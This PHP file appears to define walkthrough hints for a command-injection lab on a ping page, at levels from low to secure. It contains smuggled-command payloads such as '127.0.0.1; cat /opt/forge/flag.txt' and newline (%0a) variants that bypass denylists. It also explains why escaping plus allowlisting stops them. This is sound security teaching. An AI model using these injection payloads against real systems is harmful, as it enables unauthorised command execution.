<?php
$p = '/labs/cmdi-ping/run?host=';
return [
  'low' => [
    'goal' => "Chain a second command after the ping.",
    'steps' => [
      "Your host is pasted into: ping -c 1 HOST.",
      "A semicolon ends the ping and starts your command: 127.0.0.1; cat /opt/forge/flag.txt",
    ],
    'why' => "The input is handed to a shell as part of a command string, so a shell metacharacter like ; lets you run a second program whose output is returned to you.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('127.0.0.1; cat /opt/forge/flag.txt')]],
  ],
  'medium' => [
    'goal' => "Separate commands when ; & | are stripped.",
    'steps' => [
      "The characters ; & | are removed.",
      "A newline is also a command separator. URL-encoded it is %0a: 127.0.0.1<newline>cat /opt/forge/flag.txt",
      "The console shows it encoded as %0a in the path.",
    ],
    'why' => "Shells treat a newline as the end of a command just like a semicolon. A denylist of a few metacharacters misses it, so your second command still runs on its own line.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("127.0.0.1\ncat /opt/forge/flag.txt")]],
  ],
  'high' => [
    'goal' => "Separate commands against a longer blacklist.",
    'steps' => [
      "Many metacharacters are stripped, but the newline is still not.",
      "Use the same newline separator: 127.0.0.1%0acat /opt/forge/flag.txt",
    ],
    'why' => "No matter how long the blacklist of punctuation grows, a raw newline remains a valid separator, which is why blacklisting is the wrong approach.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("127.0.0.1\ncat /opt/forge/flag.txt")]],
  ],
  'secure' => [
    'goal' => "Confirm argument escaping plus validation stops injection.",
    'steps' => [
      "The host is validated against a strict pattern and passed through escapeshellarg.",
      "Send 127.0.0.1; cat /opt/forge/flag.txt and watch it be rejected or treated as one literal argument.",
    ],
    'why' => "escapeshellarg wraps the value so the shell sees it as a single argument, and the allowlist rejects anything that is not a plain host, so there is no shell syntax left to abuse.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('127.0.0.1; cat /opt/forge/flag.txt')]],
  ],
];
